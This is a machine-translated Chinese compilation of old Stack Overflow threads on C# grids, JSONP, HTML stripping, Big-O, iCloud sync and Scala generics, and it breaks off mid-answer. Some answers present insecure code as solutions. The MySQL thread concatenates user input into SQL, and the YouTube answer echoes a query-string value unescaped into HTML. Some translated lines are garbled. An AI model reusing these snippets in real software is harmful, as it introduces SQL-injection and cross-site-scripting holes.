经过一些研究，解决方案往往允许一次只添加一行或一列。我希望整个网格最初立即创建，所以我可以开始用数据填充它，就像使用标准 C# 2D 数组一样。

解决这个问题的最简单方法是什么？函数头可能如下所示：

`createCells(DataGridView dgv, int cols, int rows) {}`

如果需要，以后可以快速且易于将列和行更改为更大或更小的数字。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-08-04T05:14:31.840

顺便说一句，可能会出现如下错误：

> 列的 FillWeight 值之和不能超过 65535

为避免这种情况，请将`AutoGenerateColumns`属性`false`设置为 ，并为生成的每一列设置`FillWeight`为：`1`

```
dgv.AutoGenerateColumns = false;
for (int i = 1; i <= columns; i++)
{
    dgv.Columns.Add("col" + i, "column " + i);
    dgv.Columns[i - 1].FillWeight = 1;
}
for (int j = 0; j < rows; j++)
    dgv.Rows.Add(); 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-08-04T04:59:00.670

您可以通过这种方式使用 for 循环：

```
 private DataGridView DGV_Creation(DataGridView dgv, int columns, int rows)
    {
        for (int i = 1; i <= columns; i++)
        {
            dgv.Columns.Add("col" + i, "column " + i);
        }
        for (int j = 0; j < rows; j++)
        {
            dgv.Rows.Add();
        }
        return dgv;
    } 
```

调用它：

```
this.dataGridView1 = DGV_Creation(dataGridView1, 5, 10); // 5 columns, 10 rows (empty rows) 
```

或者：

```
 private void DGV_Creation(ref DataGridView dgv, int columns, int rows)
    {
        for (int i = 1; i <= columns; i++)
            dgv.Columns.Add("col" + i, "column " + i);
        for (int j = 0; j < rows; j++)
            dgv.Rows.Add();
    } 
```

调用它：

```
DGV_Creation(ref this.dataGridView1, 5, 10); //5 columns, 10 rows (empty rows) 
```

# jquery - JSONP响应上的jQuery $.ajax调用解析器错误

> ID：11806008
> 
> 赞同：1
> 
> 时间：2012-08-04T04:54:45.807
> 
> 标签：jquery, ajax, json, jsonp

哎哟！

我正在使用 WCF 服务来处理来自单独域上的 Web 服务器的 ajax 调用（因此使用 JSONP）。我的电话看起来像这样：

```
$.ajax({
    dataType: 'jsonp',
    type: 'GET',
    url: 'http://localhost/s.svc/login?callback=?&l=en&e=foo&p=bar',
    success: function (serverData) {
        // [...]
    },
    error: function (jqXHR, textStatus, errorThrown) {
        // [...]
    }
}); 
```

我从服务器得到的响应如下所示：

```
?({"DataIsValid":true,"ErrorOccurred":false,"EmailAddressValidationMessage":"","PasswordValidationMessage":""}); 
```

并且 jQuery 随后在读取它时会抛出一个**解析器错误。**

上面的响应看起来像有效的 JSON，根据文档，我认为“？callback =？” 适用于使用 JSONP 的 $.ajax 调用。

提前感谢您指出我显然缺少的内容:-)

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-07-16T13:36:03.343

我在这里看到的几件事：

1.  去掉 URL 中的回调参数。进行 jQuery JSONP 调用会添加自己的回调，并且将调用您的成功/错误函数。在后端，从请求中读取“回调”参数并使用它来包装您的 jsonp 响应（您已经在这样做了——所以不要更改那部分）。
2.  当你进入你的成功函数时，`serverData`将是一个字符串。`jQuery.parseJSON()`用or解析它`JSON.parse()`：

> var data = jQuery.parseJSON(serverData); // 或者使用 JSON.parse(serverData);

那应该这样做。

最后一件事。如果您在解析时开始收到“Unexpected token...”错误，您的 JSON 字符串中可能隐藏了一个控制字符。我遇到了这个问题，它是一个换行符（“\n”）。通过让字符串在 Chrome 的开发工具控制台等中解析，找出它是哪个字符，然后替换它：

```
var data = jQuery.parseJSON(serverData.replace(/\n/g,"")); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2015-02-11T08:40:13.047

我在 MVC 操作方法响应中缺少下面的内容（将响应包装在回调方法中）。

```
response.Write(request.Params["callback"] +"(" +htmlContent +");"); 
```

jquery ajax 调用应该如下所示。

```
jQuery.ajax({
           url:"https://servername/virtualDirectory/ActionMethod,               
           crossDomain: true,
            dataType: 'jsonp',                  
            type: 'GET',
            cache: false,
            jsonp:"callback",              
            success: function (data) {   
                alert('success');                
                $fs("#fs_container").htm(data);                   
            },
            error: function (data, status, req) {                          
               alert(req.responseText + " " + status);
            }                 
}); 
```

# c# - 在不使用 HtmlAgilityPack 的情况下剥离 HTML 标签

> ID：11806013
> 
> 赞同：1
> 
> 时间：2012-08-04T04:55:28.800
> 
> 标签：c#, .net, html, regex

我需要一种有效且（合理）可靠的方式从文档中去除 HTML 标记。它需要能够处理一些相当不利的情况：

*   根本不知道文档是否包含 HTML。
*   很可能，任何 HTML 的格式都会很差。
*   单个文档可能非常大，可能有数百兆字节。
*   无论出于什么奇怪的原因，非 HTML 内容可能仍然会充斥着尖括号，所以天真的正则表达式沿线是行不通的`<.+/?>`。（无论如何，剥离 XML 是不太可取的。）

我目前正在使用 HTML Agility Pack，它只是没有减少芥末。性能比我想要的要差，它并不总是尽可能优雅地处理真正糟糕的格式，最近我遇到了一些更令人不安的大文件的堆栈溢出问题。

我怀疑所有这些问题都源于它试图真正解析数据，这使得它不适合我的需求。我不想要语法树；我只想（大部分）标签消失。

使用正则表达式似乎是显而易见的选择。但后来我想起[了这个著名的答案](https://stackoverflow.com/a/1732454/516797)，这让我担心这不是一个好主意。但是那个谩骂的重点非常集中在解析上，而不一定是愚蠢的标签剥离。那么正则表达式可以用于此目的吗？

假设这不是一个糟糕的主意，非常欢迎对正则表达式提出好的建议。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-16T15:02:31.120

此正则表达式查找所有标签，避免标签中引号内的尖括号。

```
<[a-zA-Z0-9/_-]+?((".*?")|([^<"']+?)|('.*?'))*?> 
```

它无法检测引号内的转义引号（但我认为在 html 中是不必要的）

拥有所有允许标签的列表并在正则表达式的第一部分替换它，就像`<(tag1|tag2|...)`可以带来更精确的解决方案一样，我担心从您对尖括号的假设开始无法找到确切的解决方案，例如思考到`<a href="test.html"> b<a </a>`...之类的东西

**编辑**：

更新了正则表达式（性能比后者好很多），此外，如果您需要删除代码，我建议在第一次启动之前进行一些清理，比如`<script.+?</script>`什么都不做。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-16T15:14:39.413

我只是在这里跳出框框思考，但您可以考虑利用 Microsoft Word 或 OpenOffice 之类的东西。

我使用[Word 自动化](http://www.c-sharpcorner.com/UploadFile/amrish_deep/WordAutomation05102007223934PM/WordAutomation.aspx)将 HTML 翻译成 DOC、RTF 或 TXT。Word 原生的 HTML 到 TXT 转换将为您提供您想要的，剥离所有 HTML 标记并将其转换为文本格式。当然，如果您要处理大量微小的 HTML 文件，这根本不会有效，因为所有这些都会产生一些开销。但是，如果您要处理大量文件，这可能不是一个糟糕的选择，因为我确信 Word 对这些转换有很多优化。您可以通过在 Word 中手动打开一个最大的 HTML 文件并将其重新保存为 TXT 文件来测试该理论，然后查看 Word 需要多长时间来保存。

虽然我没有尝试过，但我敢打赌，可以通过编程方式与 OpenOffice 交互来完成类似的事情。

# signalr - SignalR 和内存使用

> ID：11806020
> 
> 赞同：1
> 
> 时间：2012-08-04T04:57:50.257
> 
> 标签：signalr

[所以我一直在玩 Scott Hanselman在这里](http://www.hanselman.com/blog/AsynchronousScalableWebApplicationsWithRealtimePersistentLongrunningConnectionsWithSignalR.aspx)简要介绍的 SignalR 库。我有一个应用程序的用途，该应用程序基本上将向用户显示实时数据（在浏览器或桌面应用程序中仍在争论中）。如果 SignalR 在 3-5 秒的循环中运行并将数据推送到客户端，我很好奇会发生什么类型的负载或内存使用。我想这最终会导致问题。如果是这样，有什么替代方案？

# algorithm - 如何计算算法的运行时间？

> ID：11806021
> 
> 赞同：4
> 
> 时间：2012-08-04T04:57:50.607
> 
> 标签：algorithm, runtime

我在一些算法书籍中读到了算法运行时，它表示为，`O(n)`. 例如，给定的代码在最佳情况下运行时间为 O(n)，最坏情况下运行时间为 O(n ³ )。这是什么意思以及如何为自己的代码计算它？是不是像线性时间一样，是不是每个预定义的库函数都有自己的运行时，在调用它之前应该牢记这一点？谢谢...

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-08-04T05:07:26.830

Big O Notation 初学者指南可能是一个不错的起点：

[http://rob-bell.net/2009/06/a-beginners-guide-to-big-o-notation/](http://rob-bell.net/2009/06/a-beginners-guide-to-big-o-notation/)

也看看维基百科

[http://en.wikipedia.org/wiki/Big_O_notation](http://en.wikipedia.org/wiki/Big_O_notation)

stackoverflow上有几个相关的问题和好的答案

[“Big O”符号的简单英文解释是什么？](https://stackoverflow.com/questions/487258/plain-english-explanation-of-big-o)

和

[八岁的Big-O？](https://stackoverflow.com/questions/107165/big-o-for-eight-year-olds)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-04T05:10:31.123

[big-O 符号](http://en.wikipedia.org/wiki/Big_O_notation)是一种渐近符号。渐近符号是数学中的一个概念，它描述了函数“在极限内”的行为——当你接近无穷大时。

定义算法运行时间的问题在于，您通常无法以毫秒为单位给出答案，因为它取决于机器，并且您无法以时钟周期或操作计数的形式给出答案，因为那将是对特定数据过于具体而无用。

查看渐近符号的简单方法是它丢弃函数中的所有常数因子。基本上，如果 n 足够大（假设一切都是正数），则²将始终大于 bn。改变常数因子 a 和 b 不会改变这一点 - 它会改变 n 的特定值，其中²更大，但不会改变它的发生。所以我们说 O(n ² ) 比 O(n) 大，并且忘记那些我们可能无论如何都不知道的常数。

这很有用，因为 n 较大的问题通常是速度慢到我们真正关心的问题。如果 n 足够小，则所花费的时间很短，选择不同算法可获得的收益也很小。当 n 变大时，选择不同的算法会产生巨大的差异。此外，现实世界中发生的问题通常比我们可以轻松测试的问题大得多——而且它们通常会随着时间的推移而不断增长（例如，随着数据库积累更多数据）。

这是一个有用的数学模型，可以抽象出足够多难以处理的细节，从而可以找到有用的结果，但它不是一个完美的系统。我们不会处理现实世界中的无限问题，而且很多时候问题足够小，以至于这些常数与现实世界的性能相关，有时你只需要用时钟来计时。

[MIT OCW Introduction to Algorithms](http://ocw.mit.edu/courses/electrical-engineering-and-computer-science/6-046j-introduction-to-algorithms-sma-5503-fall-2005/)课程非常适合这种事情。视频和其他材料是免费提供的，课程书（不是免费的）是最好的算法书籍之一。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-04T05:08:56.303

这不应该是数学吗？

如果您尝试使用已经排序的冒泡排序数组进行排序，那么您可以检查这个移动数组是否检查了任何内容。如果没有，没关系——我们完成了。

比，在最好的情况下，您将有 O(n) 次比较（准确地说是 n-1），对于最坏的情况（数组反转），您将有 O(n^2) 次比较（n(n-1)/2 ，确切地说）。

更复杂的例子。让我们找到数组的最大元素。很明显，您总是会进行 n-1 次比较，但平均分配多少次？复杂的数学答案：H(n) -1。

通常，您的答案很容易获得最佳和最坏情况，但平均需要大量数学。

我建议您阅读 Knuth，第 1 卷。但谁不会呢？

而且，正式定义：

f(n)∈O(g(n)) 表示存在 n∈N：对于所有 m>nf(m)

事实上，你必须阅读关于 wiki 的 O-notation。

# c# - 在 c# .net 服务器端创建一个下拉列表

> ID：11806025
> 
> 赞同：0
> 
> 时间：2012-08-04T04:58:13.380
> 
> 标签：c#, .net

我尝试在 c# .net 服务器端创建一个下拉列表...但这不起作用..有人知道这里出了什么问题吗？

```
 string conncetionStr = ConfigurationManager.ConnectionStrings["ApplicationServices"].ConnectionString;
    SqlConnection msSQLConnectoin = new SqlConnection(conncetionStr);
    SqlCommand msSQLCommand = msSQLConnectoin.CreateCommand();

    msSQLCommand.CommandText = "app_Event_Type_Select";
    msSQLConnectoin.Open();
    SqlDataReader msDataReader = msSQLCommand.ExecuteReader();

    while (msDataReader.Read())
    {
        dropDown.DataSource = msDataReader["Name"].ToString(); 
        dropDown.DataTextField = msDataReader["Name"].ToString();
        dropDown.DataValueField = msDataReader["EventTypeID"].ToString(); 
        dropDown.DataBind();

    } 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-04T05:04:48.950

```
string conncetionStr = ConfigurationManager.ConnectionStrings["ApplicationServices"].ConnectionString;
SqlConnection msSQLConnectoin = new SqlConnection(conncetionStr);
SqlCommand msSQLCommand = msSQLConnectoin.CreateCommand();

msSQLCommand.CommandText = "app_Event_Type_Select";
msSQLConnectoin.Open();
SqlDataReader msDataReader = msSQLCommand.ExecuteReader();

dropDown.DataSource = msDataReader; 
dropDown.DataTextField = "Name";
dropDown.DataValueField = "EventTypeID"; 
dropDown.DataBind();
msSQLConnectoin.Close();
msSQLConnectoin.Dispose();

dropDown.Items.Insert(0, "--Select Name--");
} 
```

替换`msDataReader["Name"].ToString()`为您的数据阅读器名称`msDataReader`

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-04T07:01:37.193

示例代码：

```
protected void Page_Load(object sender, EventArgs e)
    {
      bindDropdownlist()
    }

public void bindDropdownlist()
    {
         SqlDataAdapter dap = new SqlDataAdapter("select colmn1,colmn2 from table", con);
         DataSet ds = new DataSet();
         dap.Fill(ds);
         DropDownList1.DataSource = ds.Tables[0];
         DropDownList1.DataTextField = "colmn1";
         DropDownList1.DataValueField = "colmn2";
         DropDownList1.DataBind();
         DropDownList1.Items.Insert(0, "..select...");
    } 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-04T05:04:57.077

[在这里](http://msdn.microsoft.com/it-it/library/system.web.ui.webcontrols.basedataboundcontrol.datasource.aspx)阅读 该`DataSource`属性应该使用包含控件需要绑定到的所有信息的对象进行设置。和应该是对对象实际数据的`DataTextField`引用。实现目标的一种简单方法是准备一个using和字段，然后以这种方式绑定控件：`DataValueField``DataSource``DataTable``Text``Value`

```
dropDown.DataSource = dt;
dropDown.DataTextField = "Text";
dropDown.DataValueField = "Value";
dropDown.DataBind(); 
```

在msdn 网站上，您会找到相同的场景[。](http://msdn.microsoft.com/it-it/library/system.web.ui.webcontrols.listcontrol.datatextfield.aspx)

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-08-04T05:05:25.173

我相信 DataTextField 和 DataValueField 应该是您绑定的属性的字符串表示形式，请参阅此[相关帖子](http://forums.devarticles.com/net-development-43/databinding-datatextfield-in-a-drop-down-list-6825.html)：

```
 dropDown.DataSource = msDataReader;
 dropDown.DataTextField = "Name";
 dropDown.DataValueField = "EventTypeID"; 
```

# java - Java DAO 模式和运行时依赖项

> ID：11806026
> 
> 赞同：0
> 
> 时间：2012-08-04T04:58:21.093
> 
> 标签：java, dao, packaging

我们已经实现了一个典型的 DAO/抽象工厂模式。设计是这样的：

DAOFactory - 返回 MySQLFactory / SQLiteFactory 的一个实例

*   MySQLFactory - 返回与 MySQL DB 对话的 DAO
*   SQLiteFactory - 返回与 SQLite DB 对话的 DAO

事情很好。但是，我们需要创建两个可执行文件：提供给客户的一个使用 SQLiteFactory 实例和相关的 DAO。在那个可执行文件中，我们不想包含任何与 MySQLFactory 相关的类。如果我删除这些类，那么当类加载器正在加载 DAOFactory 类时，我们会在运行时看到 ClassNotFoundException。

我们如何实现我们的 DAOFactory 以便在运行时不需要 MySQLFactory ？某些其他类也存在相同的问题，即某些类仅适用于应用程序的内部版本。什么是一种好的实现方式，以便我们可以从交付给客户的软件中排除类？

谢谢深

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-04T05:15:41.037

您可以使用[`Class.forName`](http://docs.oracle.com/javase/6/docs/api/java/lang/Class.html#forName%28java.lang.String%29)在运行时加载类。例如：

```
public class DAOFactoryLoader {
  public static DAOFactory loadMySQLFactory() {
    return (DAOFactory) Class.forName("your.package.MySQLFactory").newInstance();
  }

  public static DAOFactory loadSQLiteFactory() {
    return (DAOFactory) Class.forName("your.package.SQLiteFactory").newInstance();
  }
} 
```

然后，您可以为您的软件的特定版本调用正确的方法，即`loadMySQLFactory`当您捆绑 MySQL 实现和`loadSQLiteFactory`捆绑 SQLite 实现时。

您甚至可以将类名作为 JVM 属性传递，例如。`-DdaoFactory=your.package.MySQLFactory`然后使用它来加载正确的类：

```
return (DAOFactory) Class.forName(System.getProperty("daoFactory")).newInstance(); 
```

# ruby-on-rails - 如何获得与我应该在文本框中输入的文本相同的视图输出？

> ID：11806031
> 
> 赞同：0
> 
> 时间：2012-08-04T05:00:21.880
> 
> 标签：ruby-on-rails

我在我的文本框中输入一些文本，如下格式....：-

例如...（嗨，我是 xyz。

我在一家以产品为基础的公司工作。

我是一名软件工程师。）

在输入上面的文本之后，但是我按下提交，我在我的视图中得到以下结果：-

（嗨，我是 xyz。我在一家以产品为基础的公司工作。我是一名软件工程师。）

我不知道如何获得与我在文本框中写的相同的显示。

如果有人帮助我，我将不胜感激。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-04T05:03:55.890

尝试将其放在 pre 标签中。

```
<pre><%= @variable_name %></pre> 
```

或尝试 simple_format

```
<%= simple_format(@variable_name) %> 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-04T05:04:05.417

查看[simple_format](http://api.rubyonrails.org/classes/ActionView/Helpers/TextHelper.html#method-i-simple_format)助手：

```
my_text = "Here is some basic text...\n...with a line break."

simple_format(my_text)
# => "<p>Here is some basic text...\n<br />...with a line break.</p>" 
```

您还可以添加选项以使用特定标签对其进行变形或执行清理。

# iphone - iOS - NSUbiquitousKeyValueStore 不“实际上”同步

> ID：11806034
> 
> 赞同：3
> 
> 时间：2012-08-04T05:00:50.943
> 
> 标签：iphone, objective-c, ios, synchronization, icloud

我正在使用`NSUbiquitousKeyValueStore`同步我的应用程序首选项，我正在使用两台设备 iPhone 3GS 和 iPhone 4 测试同步过程。

当我在一台设备（比如 iPhone 3GS）中更改首选项时，它会将首选项同步到`NSUbiquitousKeyValueStore`使用以下代码：

```
NSUbiquitousKeyValueStore *keyStore = [NSUbiquitousKeyValueStore defaultStore];
NSUserDefaults *userDefaults = [NSUserDefaults standardUserDefaults];

    [keyStore setObject:[userDefaults objectForKey:S_KEY_UI_SOUNDS]
                 forKey:S_KEY_UI_SOUNDS];

if ([keyStore synchronize]) {
    NSLog(@"TO ICLOUD - UI SOUNDS %@", [keyStore objectForKey:S_KEY_UI_SOUNDS]);
} 
```

但是会出现两个问题：

**第一：**虽然注册了`NSUbiquitousKeyValueStoreDidChangeExternallyNotification`，但我从未在 iPhone 4 上收到它。因此，如果 iPhone 4 处于活动状态，而 iPhone 3GS 更改了偏好，iPhone 4 就不会意识到这一点。

**第二：**当 iPhone 开始从 同步首选项时`NSUbiquitousKeyValueStore`，它永远不会使用 iPhone 3GS 获得新的首选项集（参见下面的代码）。尽管已成功同步`NSUbiquitousKeyValueStore`（同步方法返回 YES）。

```
NSUbiquitousKeyValueStore *keyStore = [NSUbiquitousKeyValueStore defaultStore];
if ([userDefaults synchronize]) {
    NSLog(@"FROM - UI SOUNDS %@", [keyStore objectForKey:S_KEY_UI_SOUNDS]);
} 
```

有解决办法吗？或者我做错了什么？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-04T05:21:37.393

首先`-synchronize`不是关于“与 iCloud 服务器同步”。这是关于同步您的更改和磁盘上的本地存储。一旦它在磁盘上，底层引擎会在它认为合适的时候将你的更改推送到云中（通常在大约 3 秒之后）。

其次，您应该订阅商店更改通知。

简而言之，使用时您应该做的第一件事`NSUbiquitousKeyValueStore`是：

```
store = [NSUbiquitousKeyValueStore defaultStore];
// subscribe immediately to any change that might happen to the store
[[NSNotificationCenter defaultCenter] addObserver:self selector:@selector(storeDidChangeExternally:) name:NSUbiquitousKeyValueStoreDidChangeExternallyNotification object:store];

// get any changes since the last app launch right now (safer)
[store synchronize]; 
```

最后，与云的同步发生在“适当的时间”（你现在无法控制它）。

只是为了给您一个想法，一旦您将内存中的更改“同步”到磁盘，引擎通常会“很快”开始与云同步并推送您的更改。

然后，服务器将向其他设备推送通知，然后这些设备也会安排与云的同步。

在正常情况下，设备同步大约需要 7 秒。

# mysql - 我在 Visual Studio 上的选择查询中遇到 MySQL 语法错误

> ID：11806042
> 
> 赞同：0
> 
> 时间：2012-08-04T05:01:40.647
> 
> 标签：mysql, syntax-error

这是我的代码，我认为我的查询是错误的。

首先，`dataTimePicker1`信息作为字符串保存到数据库中，这就是我尝试转换`dateTimePicker1`为的原因`.text`

```
private void consultarVta()
        {
            cn.Open();

            string sql = "SELECT * FROM ventas WHERE fecha ="+dateTimePicker1.Text;
            MySqlDataAdapter daVentas = new MySqlDataAdapter(sql, cn);
            DataSet dsVentas = new DataSet();
            daVentas.Fill(dsVentas, "ventas");
            dGvVentas.DataSource = dsVentas;
            dGvVentas.DataMember = "ventas";

            cn.Close();
        } 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-04T05:15:34.000

# 更新

看看这个答案：[在 asp.net (C#) 中的 SQL 查询中使用变量](https://stackoverflow.com/questions/5853660/using-variables-in-sql-queries-in-asp-net-c)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-04T05:32:45.560

这就是我所需要的，谢谢 Brandond Jerningan，该链接确实解决了我的问题，我所要做的就是：

```
string cmdText = "Select * from " + searchTable + " WHERE Name = '" +   searchValue + "'"; 
```

# ios - 待售 iOS 应用无法在应用商店中找到

> ID：11806043
> 
> 赞同：-1
> 
> 时间：2012-08-04T05:01:41.007
> 
> 标签：ios, appstore-approval

我将 iOS 应用程序上传到 appstore，现在该应用程序已发布，发布日期显示为 2012 年 8 月 3 日，昨天状态（准备出售）发生了变化。在上传过程中，我们在“选择将出售您的应用程序的应用商店”部分指定了一些地方，例如法国、卢森堡、瑞士、比利时。

我们试图在应用商店（美国）中获取该应用，但我们收到一条消息，因为该应用目前在美国应用商店中不可用，我们现在在印度，我们还尝试通过单击应用商店中的查看链接来查看该应用iTunes 连接应用程序页面，但上面给出的消息正在显示（该应用程序当前在美国应用程序商店中不可用）。

这是appstore选择的地方有问题吗？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-08-04T05:05:03.660

> 在上传过程中，我们在“选择将出售您的应用程序的应用商店”部分指定了一些地方，例如法国、卢森堡、瑞士、比利时。

那些“一些地方”包括美国吗？如果没有，我无法想象您为什么希望该应用程序可以在美国应用程序商店中使用。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-03-20T08:22:08.637

确保您已将可用性日期设置在当前日期之前。签入您的应用程序 --> 权利和定价 -> 上市日期。希望这可以帮助。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2014-03-26T11:20:47.897

对于初学者，您的应用未设置为可在美国应用商店销售，因此您将无法在美国应用商店中找到您的应用。

要查看该应用程序，您需要一个为该应用程序可用的国家之一设置的 Apple ID，例如法国。

使用该 Apple ID 登录 iTunes/App Store，您将能够搜索该国家/地区的应用程序。

如果您设置新的 Apple ID 只是为了测试，那么我建议您按照步骤设置没有信用卡的 Apple ID ( [http://support.apple.com/kb/ht2534](http://support.apple.com/kb/ht2534) )。否则，您将不得不为信用卡输入信用卡详细信息，然后才能访问 App Store/iTunes Store。

注意：应用程序发布后，它确实需要时间（即数小时）才能出现在应用程序商店中。

# java - 依次执行打印和保存作业

> ID：11806046
> 
> 赞同：0
> 
> 时间：2012-08-04T05:02:22.510
> 
> 标签：java, swing, pdf, printing

我必须打印一张账单。帐单设计是使用 Java`Graphics2D`完成的，帐单的某些部分是通过从 Java Applet 中检索文本来填充的`JTextFields`。它工作正常。`JTextFields`但我还需要做的是，我必须将整个打印输出的副本（不仅仅是`pdf`. 出于测试打印输出中文本对齐的目的，我将其保存为`pdf`using PDFXChange 4.0 in the `Print`dialog 。但我不能总是做 2 项工作 - 首先使用 PDFExchange 保存它，然后在打印机中打印出来。请指导我如何使用 Java 一次性实现这一目标。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-04T06:08:24.540

我可能会尝试使用 iText 之类的东西将 Graphics2D 直接发送到 PDF

结帐[如何使用 iText 将图形绘制到 PDF？](https://stackoverflow.com/questions/7830928/how-do-i-draw-graphics-to-pdf-using-itext)例如。

您必须自己处理分页。

或者，您可以将每个页面保存到图像（使用 ImageIO API）并将每个图像插入 PDF

# scala - 在这个参数化的 Scala 函数中，为什么我需要强制转换？

> ID：11806051
> 
> 赞同：5
> 
> 时间：2012-08-04T05:03:06.153
> 
> 标签：scala

在这个参数化函数中，为什么我需要强制转换？我怎样才能摆脱它？

```
/** Filters `xs` to have only every nth element.
  */
def everyNth[A <% Iterable[B], B](xs: A, n: Int, offset: Int = 0): A =
  (xs.zipWithIndex collect { case (x, i) if (i - offset) % n == 0 => x }).asInstanceOf[A] 
```

如果最后没有演员表，我会收到以下错误消息：

```
type mismatch; found : Iterable[B] required: A 
```

这个函数（带有强制转换）适用于我尝试过的所有情况，并且我通过在 REPL 中键入以下内容知道，当不在参数化函数的上下文中时，Scala 能够正确推断结果类型：

```
scala> val a: Stream[Int] = (Stream.from(0).zipWithIndex collect { case (x, i) if (i + 3) % 5 == 0 => x })
a: Stream[Int] = Stream(2, ?)

scala> a take 10 force
res20: scala.collection.immutable.Stream[Int] = Stream(2, 7, 12, 17, 22, 27, 32, 37, 42, 47) 
```

请解释！

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-08-07T00:49:20.360

根据评论中的一些建议，我研究了 CanBuildFrom，这就是我想出的：

```
import scala.collection.IterableLike
import scala.collection.generic.CanBuildFrom

/** Filters `xs` to have only every nth element.
  */
def everyNth[A, It <: Iterable[A]]
        (xs: It with IterableLike[A, It], n: Int, offset: Int = 0)
        (implicit bf: CanBuildFrom[It, A , It]): It = {
  val retval = bf()
  retval ++= xs.zipWithIndex collect { case (x, i) if (i - offset) % n == 0 => x }
  retval.result     
} 
```

耶，它工作！

而且***没有演员***表。因此，它甚至适用于 Ranges。

但是，必须从一个空的 retval 开始，然后使用 "++=" 来填充它似乎有点不雅，所以如果有人有更优雅的解决方案，我会全神贯注。

这是我实现的另一个泛型函数，它比上面的要复杂一些，因为返回类型与参数类型不同。即输入是一个`A`'s序列，但输出是一个`(A, A)`'s序列：

```
def zipWithSelf[A, It[A] <: Iterable[A]]
        (xs: It[A] with IterableLike[A, It[A]])
        (implicit bf:  CanBuildFrom[It[A], (A, A), It[(A, A)]]): It[(A, A)] = {
    val retval = bf()
    if (xs.nonEmpty) {
      retval ++= xs zip xs.tail
      retval.result
  } else retval.result
} 
```

这是另一个：

```
/** Calls `f(x)` for all x in `xs` and returns an Iterable containing the indexes for
  * which `f(x)` is true.
  *
  * The type of the returned Iterable will match the type of `xs`. 
  */
def findAll[A, It[A] <: Iterable[A]]
        (xs: It[A] with IterableLike[A, It[A]])
        (f: A => Boolean)
        (implicit bf:  CanBuildFrom[It[A], Int, It[Int]]): It[Int] = {
    val retval = bf()
    retval ++= xs.zipWithIndex filter { p => f(p._1) } map { _._2 }
    retval.result
} 
```

我仍然对“Like”类型和 没有任何深入的了解`CanBuildFrom`，但我明白了要点。在大多数情况下，将泛型函数的强制转换版本编写为第一遍是很容易的，然后添加`CanBuildFrom`和`IterableLike`样板以使函数更通用和完全类型安全。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-08-04T05:15:23.440

在某些情况下，`collect`它不会返回与`Iterable`调用相同的子类型，例如在 a 的情况下`Range`：

```
scala> everyNth(1 to 10, 2)
java.lang.ClassCastException: scala.collection.immutable.Vector cannot be cast to scala.collection.immutable.Range$Inclusive
        at .<init>(<console>:9)
        at .<clinit>(<console>)
        at .<init>(<console>:11)
        at .<clinit>(<console>)
        at $print(<console>)
        at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
        at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:57)
        at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)
        at java.lang.reflect.Method.invoke(Method.java:616)
        at scala.tools.nsc.interpreter.IMain$ReadEvalPrint.call(IMain.scala:704)
        at scala.tools.nsc.interpreter.IMain$Request$$anonfun$14.apply(IMain.scala:920)
        at scala.tools.nsc.interpreter.Line$$anonfun$1.apply$mcV$sp(Line.scala:43)
        at scala.tools.nsc.io.package$$anon$2.run(package.scala:25)
        at java.lang.Thread.run(Thread.java:679) 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-08-04T10:02:46.123

这里的问题是，通过调用`collect`xs 将其转换为`Iterable[B]`. `A <% Iterable[B]`意味着，`A`可以被视为`Iterable[B]`，这并不一定意味着，`Iterable[B]`也可以被视为`A`。这里实际发生的是

```
def everyNth[A, B](xs: A, n: Int, offset: Int = 0)(implicit view: (A => Iterable[B])): A =
  (view(xs).zipWithIndex collect {
    case (x, i) if (i + offset) % n == 0 => x
  }).asInstanceOf[A] 
```

当我有例如这个：

```
class Foo
implicit def foo2Iterable(foo: Foo) = List(foo) 
```

并打电话

```
everyNth(new Foo, 2) 
```

我明白了

```
java.lang.ClassCastException: scala.collection.immutable.$colon$colon cannot be cast to Foo 
```

你应该避免在这里投射。要么你添加一个视图`Iterable[B] => A`

编辑：类型绑定在这里不起作用。

# c# - 如何通过查询字符串从 youtube 更改嵌入代码中的部分 URL

> ID：11806054
> 
> 赞同：0
> 
> 时间：2012-08-04T05:03:27.377
> 
> 标签：c#, asp.net

我正在使用 C# 在 ASP.NET 上编程。我想知道如何通过查询字符串从 youtube 更改嵌入代码中的部分 URL。例如

```
<iframe width="560" height="315" src="http://www.youtube.com/embed/**5CZobYTEwaY**" frameborder="0" allowfullscreen></iframe> 
```

我想通过查询字符串接收视频变量并插入而不是**5CZobYTEwaY**。

如果有人帮助我，我将非常感激。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-04T13:37:27.993

请在下面的代码中用您的查询字符串变量“id”替换 test.asp?id=5CZobYTEwaY

```
<iframe width="560" height="315" src='http://www.youtube.com/embed/<%=Request.QueryString["id"]%>' frameborder="0" allowfullscreen></iframe> 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-04T05:37:50.440

您可以使用`<asp:Literal`在您的页面上输出一个干净的字符串。

尝试这个：

```
